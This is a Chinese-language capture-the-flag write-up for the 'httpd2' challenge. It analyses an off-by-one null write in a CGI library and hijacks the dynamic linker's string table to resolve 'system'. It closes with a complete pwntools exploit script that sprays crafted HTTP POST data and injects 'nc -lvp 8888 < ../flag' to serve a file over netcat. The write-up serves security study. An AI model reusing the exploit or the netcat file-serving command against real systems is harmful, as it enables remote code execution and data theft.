---
data: 2024-07-20 16:31
challenge: httpd2
tags:
  - dlresolve
  - spary
---

> [!info]
> 题目本身不难，对于线下赛我认为工作量也是很合适的。针对动态链接的攻击非常有趣，是一道好题。
>
> 但是比赛期间我没有解出来（0 解），原因如下：
>
> 1. 题目存在两处漏洞，都是越界写。但是越界 buffer 的附近没有任何数据
> 2. 利用涉及喷射 - 命中的思路，线下赛期间感觉思路比较混乱
> 3. ~~此外就是被本地出了远程爆破半天出不来的 solo 题和虚拟机逆向题折磨得神志不清~~

## Analysis

cgi-bin 目录下一共给了三个文件，其中漏洞只有可能存在于 `libctfc.so`（因为另外两个都过于直白了），其中有用的洞是 `genCookie` 函数里的越界写 0：

```c
v4 = strlen(passwd);
sub_135A(dest, 1024LL, passwd, v4 + 1);
dest[v4] = 0;
```

<details>
<summary> 调试 </summary>

这种题目的调试我一般使用 gdbserver，直接在 docker 里面安装，替换 main.cgi 内容为 `gdbserver 0.0.0.0:1234 ./real.cgi` 即可调试，相关脚本见 [initgdb.sh](./bin/cgi-bin/initgdb.sh)。

</details>

接下来关闭 aslr 进入调试，定位到越界写 0 的基地址位于 `libctfc.so + 0x14300`，这时候可以想到劫持 `libctf.so` 的 `link_map` 中 `l_info[DT_STRTAB]` 地址到恶意布置好的 `fake_strtab` 上即可：

- `link_map` 结构体：
  - [source/elf/link.h#L101](https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/link.h#L101)
  - 通常位于 `GOT + 8` 的位置，包含程序的基址和名字
  - 构成双向链表

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				   file and the addresses in memory.  */
    char *l_name;		/* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };
```

- `_dl_fixup` 中利用 strtab 解析目标函数地址：
  - [source/elf/dl-runtime.c#L49](https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L49)
  - 这里只是找到 strtab、symtab 等地址，其中再用符号名称在字符数组的偏移 `st_name` 计算出最终的符号字符串地址，传给 `_dl_lookup_symbol_x` 完成解析
  - 因此伪造 strtab 仅需考虑偏移即可

```c
_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL])
		      + reloc_offset (pltgot, reloc_arg));
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

// ...
// L95:
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
```

因此题目的意图其实很明显，就是用越界写的 `\x00` 篡改指向 `l_info[DT_STRTAB]` 的指针，命中实现布置好的 `fake_strtab`，其中要求：

- 伪造的 `strtab + 8` 处存放一个指针，指向伪造的字符串数组，其中计算好的偏移上存放 `system\x00`：

```bash
pwndbg> telescope 0x7ffff7e9b000
00:0000│  0x7ffff7e9b000 ◂— 0x3e10
01:0008│  0x7ffff7e9b008 —▸ 0x7ffff7fbc1e0 —▸ 0x7ffff7e97000 ◂— 0x10102464c457f
02:0010│  0x7ffff7e9b010 —▸ 0x7ffff7fd8d30 ◂— endbr64
03:0018│  0x7ffff7e9b018 (printf@got[plt]) —▸ 0x7ffff7e98030 ◂— endbr64
04:0020│  0x7ffff7e9b020 (strcmp@got[plt]) —▸ 0x7ffff7e98040 ◂— endbr64
05:0028│  0x7ffff7e9b028 (getPass@got.plt) —▸ 0x7ffff7e98050 ◂— endbr64
06:0030│  0x7ffff7e9b030 (genCookie@got.plt) —▸ 0x7ffff7e83a5a (genCookie) ◂— endbr64
07:0038│  0x7ffff7e9b038 ◂— 0x7ffff7e9b038
pwndbg> telescope 0x7ffff7fbc1e0
00:0000│  0x7ffff7fbc1e0 —▸ 0x7ffff7e97000 ◂— 0x10102464c457f
01:0008│  0x7ffff7fbc1e8 —▸ 0x7ffff7fbc1d0 ◂— './libctf.so'
02:0010│  0x7ffff7fbc1f0 —▸ 0x7ffff7e9ae10 ◂— 1
03:0018│  0x7ffff7fbc1f8 —▸ 0x7ffff7fbc740 —▸ 0x7ffff7e82000 ◂— 0x10102464c457f
04:0020│  0x7ffff7fbc200 —▸ 0x7ffff7ffe890 —▸ 0x7ffff7fc2000 ◂— jg 0x7ffff7fc2047
05:0028│  0x7ffff7fbc208 —▸ 0x7ffff7fbc1e0 —▸ 0x7ffff7e97000 ◂— 0x10102464c457f
06:0030│  0x7ffff7fbc210 ◂— 0
07:0038│  0x7ffff7fbc218 —▸ 0x7ffff7fbc670 —▸ 0x7ffff7fbc688 ◂— 'libctf.so'
pwndbg>
08:0040│  0x7ffff7fbc220 ◂— 0
09:0048│  0x7ffff7fbc228 —▸ 0x7ffff7e9ae20 ◂— 1
0a:0050│  0x7ffff7fbc230 —▸ 0x7ffff7e9aef0 ◂— 2
0b:0058│  0x7ffff7fbc238 —▸ 0x7ffff7e9aee0 ◂— 3
0c:0060│  0x7ffff7fbc240 ◂— 0
0d:0068│  0x7ffff7fbc248 —▸ 0x7ffff7e9aea0 ◂— 5
0e:0070│  0x7ffff7fbc250 —▸ 0x7ffff7e9aeb0 ◂— 6
0f:0078│  0x7ffff7fbc258 —▸ 0x7ffff7e9af20 ◂— 7
pwndbg> telescope 0x7ffff7e9aea0
00:0000│  0x7ffff7e9aea0 ◂— 5
01:0008│  0x7ffff7e9aea8 —▸ 0x7ffff7e97408 ◂— 0x5f6e6f6d675f5f00
02:0010│  0x7ffff7e9aeb0 ◂— 6
03:0018│  0x7ffff7e9aeb8 —▸ 0x7ffff7e97318 ◂— 0
04:0020│  0x7ffff7e9aec0 ◂— 0xa /* '\n' */
05:0028│  0x7ffff7e9aec8 ◂— 0xa1
06:0030│  0x7ffff7e9aed0 ◂— 0xb /* '\x0b' */
07:0038│  0x7ffff7e9aed8 ◂— 0x18
pwndbg> x/32s 0x7ffff7e97408
0x7ffff7e97408: ""
0x7ffff7e97409: "__gmon_start__"
0x7ffff7e97418: "_ITM_deregisterTMCloneTable"
0x7ffff7e97434: "_ITM_registerTMCloneTable"
0x7ffff7e9744e: "__cxa_finalize"
0x7ffff7e9745d: "checkLogin"
0x7ffff7e97468: "genCookie"
0x7ffff7e97472: "getPass"
```

上述伪造建立在我们输入的参数

## Exploitation

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

# cli_script()
# set_remote_libc("libc.so.6")
#
# io: tube = gift.io
# elf: ELF = gift.elf
# libc: ELF = gift.libc

context.log_level = "info"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

io = remote("127.0.0.1", 80)

while True:
    try:

        def get_payload(name, passwd, spary_payload):
            payload = b"POST /cgi-bin/main.cgi HTTP/1.1\r\n"
            payload += b"Host: localhost\r\n"
            payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
            payload += b"Connection: close\r\n"

            post_data = b"username=" + name + b"&passwd=" + passwd + spary_payload
            payload += f"Content-Length: {len(post_data)}\r\n".encode()
            payload += b"\r\n"
            payload += post_data
            payload += b"\r\n"
            return payload

        spary_payload = b""
        for i in range(0xC0 + 0x10, 0x5000, 8):
            if ((i - 8) & 0xFFF) == 0xEA0:
                spary_payload += b"&" + b"a" * 0x69 + b"%00system%00"
            else:
                spary_payload += b"&x"

        distance = 0x125F48
        payload = get_payload(
            b"nc -lvp 8888 < ../flag", b"a" * (distance + 2), spary_payload
        )
        s(payload)

        data = rl()
        print(data)
        assert b"500" not in data()

        ia()
    except:
        io.close()
        io = remote("127.0.0.1", 80)


# buf = 0x7ffff7e96300
# target_strtab = 0x7ffff7fbc248
```

---

## References

\[1\] [Official WP - xctf final 2024 httpd2 writeup](https://forum.butian.net/share/3123) . _[noir](https://forum.butian.net/people/32623)_
